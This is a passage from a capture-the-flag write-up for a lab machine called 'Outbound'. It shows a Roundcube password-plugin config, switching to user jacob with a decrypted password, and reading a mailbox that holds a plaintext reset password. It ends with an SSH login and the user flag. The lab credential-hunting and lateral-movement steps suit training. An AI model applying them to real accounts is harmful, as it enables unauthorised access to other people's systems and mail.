e.g. &quot;dc=test,dc=domain,dc=com&quot;</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>(uid=%login)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>(&amp;(objectClass=posixAccount)(uid=%login))<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_search_filter<span class="string">&#x27;] = &#x27;</span>(uid=%login)<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP password hash type</span></span><br><span class="line"><span class="string">// Standard LDAP encryption type which must be one of: crypt,</span></span><br><span class="line"><span class="string">// ext_des, md5crypt, blowfish, md5, sha, smd5, ssha, ad, cram-md5 (dovecot style) or clear.</span></span><br><span class="line"><span class="string">// Set to &#x27;</span>default<span class="string">&#x27; if you want to use method specified in password_algorithm option above.</span></span><br><span class="line"><span class="string">// Multiple password Values can be generated by concatenating encodings with a +. E.g. &#x27;</span>cram-md5+crypt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">// Default: &#x27;</span>crypt<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_encodage<span class="string">&#x27;] = &#x27;</span>crypt<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP password attribute</span></span><br><span class="line"><span class="string">// Name of the ldap&#x27;</span>s attribute used <span class="keyword">for</span> storing user password</span><br><span class="line">// Default: <span class="string">&#x27;userPassword&#x27;</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_pwattr&#x27;</span>] = <span class="string">&#x27;userPassword&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// LDAP password force replace</span><br><span class="line">// Force LDAP replace <span class="keyword">in</span> cases <span class="built_in">where</span> ACL allows only replace not <span class="built_in">read</span></span><br><span class="line">// See http://pear.php.net/package/Net_LDAP2/docs/latest/Net_LDAP2/Net_LDAP2_Entry.html<span class="comment">#methodreplace</span></span><br><span class="line">// Default: <span class="literal">true</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_force_replace&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">// LDAP Password Last Change Date</span><br><span class="line">// Some places use an attribute to store the <span class="built_in">date</span> of the last password change</span><br><span class="line">// The <span class="built_in">date</span> is measured <span class="keyword">in</span> <span class="string">&quot;days since epoch&quot;</span> (an <span class="built_in">integer</span> value)</span><br><span class="line">// Whenever the password is changed, the attribute will be updated <span class="keyword">if</span> <span class="built_in">set</span> (e.g. shadowLastChange)</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_ldap_lchattr&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// LDAP Samba password attribute, e.g. sambaNTPassword</span><br><span class="line">// Name of the LDAP<span class="string">&#x27;s Samba attribute used for storing user password</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_samba_pwattr<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP Samba Password Last Change Date attribute, e.g. sambaPwdLastSet</span></span><br><span class="line"><span class="string">// Some places use an attribute to store the date of the last password change</span></span><br><span class="line"><span class="string">// The date is measured in &quot;seconds since epoch&quot; (an integer value)</span></span><br><span class="line"><span class="string">// Whenever the password is changed, the attribute will be updated if set</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_samba_lchattr<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP PPolicy Driver options</span></span><br><span class="line"><span class="string">// -----------------------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP Change password command - filename of the perl script</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>change_ldap_pass.pl<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_cmd<span class="string">&#x27;] = &#x27;</span>change_ldap_pass.pl<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP URI</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>ldap://ldap.example.com/ ldaps://ldap2.example.com:636/<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_uri<span class="string">&#x27;] = &#x27;</span>ldap://localhost/<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP base name (root directory)</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>dc=example,dc=com<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_basedn<span class="string">&#x27;] = &#x27;</span>dc=example,dc=com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_searchDN<span class="string">&#x27;] = &#x27;</span>cn=someuser,dc=example,dc=com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_searchPW<span class="string">&#x27;] = &#x27;</span>secret<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// LDAP search filter</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>(uid=%login)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">// Example: &#x27;</span>(&amp;(objectClass=posixAccount)(uid=%login))<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_search_filter<span class="string">&#x27;] = &#x27;</span>(uid=%login)<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// CA Certificate file if in URI is LDAPS connection</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ldap_ppolicy_cafile<span class="string">&#x27;] = &#x27;</span>/etc/ssl/cacert.crt<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// DirectAdmin Driver options</span></span><br><span class="line"><span class="string">// --------------------------</span></span><br><span class="line"><span class="string">// The host which changes the password</span></span><br><span class="line"><span class="string">// Use &#x27;</span>ssl://host<span class="string">&#x27; instead of &#x27;</span>tcp://host<span class="string">&#x27; when running DirectAdmin over SSL.</span></span><br><span class="line"><span class="string">// The host can contain the following macros that will be expanded as follows:</span></span><br><span class="line"><span class="string">//     %h is replaced with the imap host (from the session info)</span></span><br><span class="line"><span class="string">//     %d is replaced with the domain part of the username (if the username is an email)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_directadmin_host<span class="string">&#x27;] = &#x27;</span>tcp://localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TCP port used for DirectAdmin connections</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_directadmin_port<span class="string">&#x27;] = 2222;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// vpopmaild Driver options</span></span><br><span class="line"><span class="string">// -----------------------</span></span><br><span class="line"><span class="string">// The host which changes the password</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_vpopmaild_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TCP port used for vpopmaild connections</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_vpopmaild_port<span class="string">&#x27;] = 89;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Timeout used for the connection to vpopmaild (in seconds)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_vpopmaild_timeout<span class="string">&#x27;] = 10;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// cPanel Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// The cPanel Host name</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_cpanel_host<span class="string">&#x27;] = &#x27;</span>host.domain.com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// The cPanel port to use</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_cpanel_port<span class="string">&#x27;] = 2096;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// XIMSS (Communigate server) Driver options</span></span><br><span class="line"><span class="string">// -----------------------------------------</span></span><br><span class="line"><span class="string">// Host name of the Communigate server</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ximss_host<span class="string">&#x27;] = &#x27;</span>mail.example.com<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// XIMSS port on Communigate server</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_ximss_port<span class="string">&#x27;] = 11024;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// chpasswd Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// Command to use (see &quot;Sudo setup&quot; in README)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_chpasswd_cmd<span class="string">&#x27;] = &#x27;</span>sudo /usr/sbin/chpasswd 2&gt; /dev/null<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// XMail Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">$config[&#x27;</span>xmail_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>xmail_user<span class="string">&#x27;] = &#x27;</span>YourXmailControlUser<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>xmail_pass<span class="string">&#x27;] = &#x27;</span>YourXmailControlPass<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>xmail_port<span class="string">&#x27;] = 6017;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// hMail Driver options</span></span><br><span class="line"><span class="string">// -----------------------</span></span><br><span class="line"><span class="string">// Remote hMailServer configuration</span></span><br><span class="line"><span class="string">// true:  HMailserver is on a remote box (php.ini: com.allow_dcom = true)</span></span><br><span class="line"><span class="string">// false: Hmailserver is on same box as PHP</span></span><br><span class="line"><span class="string">$config[&#x27;</span>hmailserver_remote_dcom<span class="string">&#x27;] = false;</span></span><br><span class="line"><span class="string">// Windows credentials</span></span><br><span class="line"><span class="string">$config[&#x27;</span>hmailserver_server<span class="string">&#x27;] = [</span></span><br><span class="line"><span class="string">    &#x27;</span>Server<span class="string">&#x27;   =&gt; &#x27;</span>localhost<span class="string">&#x27;,      // hostname or ip address</span></span><br><span class="line"><span class="string">    &#x27;</span>Username<span class="string">&#x27; =&gt; &#x27;</span>administrator<span class="string">&#x27;,  // windows username</span></span><br><span class="line"><span class="string">    &#x27;</span>Password<span class="string">&#x27; =&gt; &#x27;</span>password<span class="string">&#x27;        // windows user password</span></span><br><span class="line"><span class="string">];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// pw_usermod Driver options</span></span><br><span class="line"><span class="string">// --------------------------</span></span><br><span class="line"><span class="string">// Use comma delimited exlist to disable password change for users.</span></span><br><span class="line"><span class="string">// See &quot;Sudo setup&quot; in README file.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_pw_usermod_cmd<span class="string">&#x27;] = &#x27;</span>sudo /usr/sbin/pw usermod -h 0 -n<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// DBMail Driver options</span></span><br><span class="line"><span class="string">// -------------------</span></span><br><span class="line"><span class="string">// Additional arguments for the dbmail-users call</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_dbmail_args<span class="string">&#x27;] = &#x27;</span>-p sha512<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Expect Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// Location of expect binary</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_expect_bin<span class="string">&#x27;] = &#x27;</span>/usr/bin/expect<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Location of expect script (see helpers/passwd-expect)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_expect_script<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Arguments for the expect script. See the helpers/passwd-expect file for details.</span></span><br><span class="line"><span class="string">// This is probably a good starting default:</span></span><br><span class="line"><span class="string">//   -telnet -host localhost -output /tmp/passwd.log -log /tmp/passwd.log</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_expect_params<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// smb Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// Samba host (default: localhost)</span></span><br><span class="line"><span class="string">// Supported replacement variables:</span></span><br><span class="line"><span class="string">// %n - hostname ($_SERVER[&#x27;</span>SERVER_NAME<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">// %t - hostname without the first part</span></span><br><span class="line"><span class="string">// %d - domain (http hostname $_SERVER[&#x27;</span>HTTP_HOST<span class="string">&#x27;] without the first part)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_smb_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">// Location of smbpasswd binary (default: /usr/bin/smbpasswd)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_smb_cmd<span class="string">&#x27;] = &#x27;</span>/usr/bin/smbpasswd<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// gearman driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// Gearman host (default: localhost)</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_gearman_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk/PPA Driver options</span></span><br><span class="line"><span class="string">// --------------------</span></span><br><span class="line"><span class="string">// You need to allow RCP for IP of roundcube-server in Plesk/PPA Panel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk RCP Host</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_plesk_host<span class="string">&#x27;] = &#x27;</span>10.0.0.5<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk RPC Username</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_plesk_user<span class="string">&#x27;] = &#x27;</span>admin<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk RPC Password</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_plesk_pass<span class="string">&#x27;] = &#x27;</span>password<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk RPC Port</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_plesk_rpc_port<span class="string">&#x27;] = &#x27;</span>8443<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Plesk RPC Path</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_plesk_rpc_path<span class="string">&#x27;] = &#x27;</span>enterprise/control/agent.php<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// kpasswd Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// Command to use</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_kpasswd_cmd<span class="string">&#x27;] = &#x27;</span>/usr/bin/kpasswd<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Modoboa Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string">// put token number from Modoboa server</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_modoboa_api_token<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Mail-in-a-Box Driver options</span></span><br><span class="line"><span class="string">// ----------------------------</span></span><br><span class="line"><span class="string">// the url to the control panel of Mail-in-a-Box, e.g. https://box.example.com/admin/</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_miab_url<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">// name (email) of the admin user used to access api</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_miab_user<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">// password of the admin user used to access api</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_miab_pass<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// TinyCP</span></span><br><span class="line"><span class="string">// --------------</span></span><br><span class="line"><span class="string">// TinyCP host, port, user and pass.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_tinycp_host<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_tinycp_port<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_tinycp_user<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_tinycp_pass<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// HTTP-API Driver options</span></span><br><span class="line"><span class="string">// ---------------------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Base URL of password change API. HTTPS recommended.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_httpapi_url<span class="string">&#x27;] = &#x27;</span>https://passwordserver.example.org<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Method (also affects how vars are sent). Default: POST.</span></span><br><span class="line"><span class="string">// GET is not recommended as passwords will appears in the remote webserver&#x27;</span>s access <span class="built_in">log</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_httpapi_method&#x27;</span>] = <span class="string">&#x27;POST&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// GET or POST variable <span class="keyword">in</span> <span class="built_in">which</span> to put the username</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_httpapi_var_user&#x27;</span>] = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// GET or POST variable <span class="keyword">in</span> <span class="built_in">which</span> to put the current password</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_httpapi_var_curpass&#x27;</span>] = <span class="string">&#x27;curpass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// GET or POST variable <span class="keyword">in</span> <span class="built_in">which</span> to put the new password</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password_httpapi_var_newpass&#x27;</span>] = <span class="string">&#x27;newpass&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// HTTP codes other than 2xx are assumed to mean the password changed failed.</span><br><span class="line">// Optionally, <span class="keyword">if</span> <span class="built_in">set</span>, this variable additionally checks the body of the 2xx response to</span><br><span class="line">// confirm the change. It<span class="string">&#x27;s a preg_match regular expression.</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_httpapi_expect<span class="string">&#x27;] = &#x27;</span>/^ok$/i<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// dovecot_passwdfile</span></span><br><span class="line"><span class="string">// ------------------</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_dovecot_passwdfile_path<span class="string">&#x27;] = &#x27;</span>/etc/mail/imap.passwd<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Mailcow driver options</span></span><br><span class="line"><span class="string">// ----------------------</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_mailcow_api_host<span class="string">&#x27;] = &#x27;</span>localhost<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">$config[&#x27;</span>password_mailcow_api_token<span class="string">&#x27;] = &#x27;</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure></div>
+</details>
+
+<p>Now we decrypt that with triple des decrypt:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ su jacob</span><br><span class="line">Password: 595mO8DmwGeD</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(jacob) gid=1001(jacob) <span class="built_in">groups</span>=1001(jacob)</span><br></pre></td></tr></table></figure></div>
+
+<p>Next by inspecting jacob’s mail directory we can see he has the password for his main account sent there:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/jacob/mail/INBOX</span><br><span class="line"><span class="built_in">cat</span> jacob</span><br><span class="line">From tyler@outbound.htb  Sat Jun 07 14:00:58 2025</span><br><span class="line">Return-Path: &lt;tyler@outbound.htb&gt;</span><br><span class="line">X-Original-To: jacob</span><br><span class="line">Delivered-To: jacob@outbound.htb</span><br><span class="line">Received: by outbound.htb (Postfix, from userid 1000)</span><br><span class="line">        <span class="built_in">id</span> B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)</span><br><span class="line">To: jacob@outbound.htb</span><br><span class="line">Subject: Important Update</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;20250607140058.B32C410248D@outbound.htb&gt;</span><br><span class="line">Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)</span><br><span class="line">From: tyler@outbound.htb</span><br><span class="line">X-IMAPbase: 1749304753 0000000002</span><br><span class="line">X-UID: 1</span><br><span class="line">Status: </span><br><span class="line">X-Keywords:                                                                       </span><br><span class="line">Content-Length: 233</span><br><span class="line"></span><br><span class="line">Due to the recent change of policies your password has been changed.</span><br><span class="line"></span><br><span class="line">Please use the following credentials to <span class="built_in">log</span> into your account: gY4Wr3a1evp4</span><br><span class="line"></span><br><span class="line">Remember to change your password when you next <span class="built_in">log</span> into your account.</span><br><span class="line"></span><br><span class="line">Thanks!</span><br><span class="line"></span><br><span class="line">Tyler</span><br><span class="line"></span><br><span class="line">From mel@outbound.htb  Sun Jun 08 12:09:45 2025</span><br><span class="line">Return-Path: &lt;mel@outbound.htb&gt;</span><br><span class="line">X-Original-To: jacob</span><br><span class="line">Delivered-To: jacob@outbound.htb</span><br><span class="line">Received: by outbound.htb (Postfix, from userid 1002)</span><br><span class="line">        <span class="built_in">id</span> 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)</span><br><span class="line">To: jacob@outbound.htb</span><br><span class="line">Subject: Unexpected Resource Consumption</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;20250608120945.1487E22C@outbound.htb&gt;</span><br><span class="line">Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)</span><br><span class="line">From: mel@outbound.htb</span><br><span class="line">X-UID: 2</span><br><span class="line">Status: </span><br><span class="line">X-Keywords:                                                                       </span><br><span class="line">Content-Length: 261</span><br><span class="line"></span><br><span class="line">We have been experiencing high resource consumption on our main server.</span><br><span class="line">For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.</span><br><span class="line">Please inform us immediately <span class="keyword">if</span> you notice any irregularities.</span><br><span class="line"></span><br><span class="line">Thanks!</span><br><span class="line"></span><br><span class="line">Mel</span><br></pre></td></tr></table></figure></div>
+
+<p>We login and get the user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh jacob@outbound.htb</span><br><span class="line">jacob@outbound.htb<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> System information as of Fri Jul 18 09:57:08 AM UTC 2025</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:  0.0               Processes:             249</span></span><br><span class="line"><span class="string">  Usage of /:   69.9% of 6.73GB   Users logged in:       0</span></span><br><span class="line"><span class="string">  Memory usage: 10%               IPv4 address for eth0: 10.10.11.77</span></span><br><span class="line"><span class="string">  Swap usage:   0%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s</span></span><br><span class="line"><span class="string">   just raised the bar for easy, resilient and secure K8s cluster deployment.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   https://ubuntu.com/engage/secure-kubernetes-at-the-edge</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Expanded Security Maintenance for Applications is not enabled.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0 updates can be applied immediately.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Enable ESM Apps to receive additional future security updates.</span></span><br><span class="line"><span class="string">See https://ubuntu.com/esm or run: sudo pro status</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The list of available updates is more than a week old.</span></span><br><span class="line"><span class="string">To check for new updates run: sudo apt update</span></span><br><span class="line"><span class="string">Last login: Thu Jul 10 11:44:49 2025 from 10.10.14.77</span></span><br><span class="line"><span class="string">jacob@outbound:~$ cat user.txt </span></span><br><span class="line"><span class="string">cbc080c41090f4c5edcb5a3e2f2bf5c6</span></span><br><span class="line"><span class="string">jacob@outbound:~$ 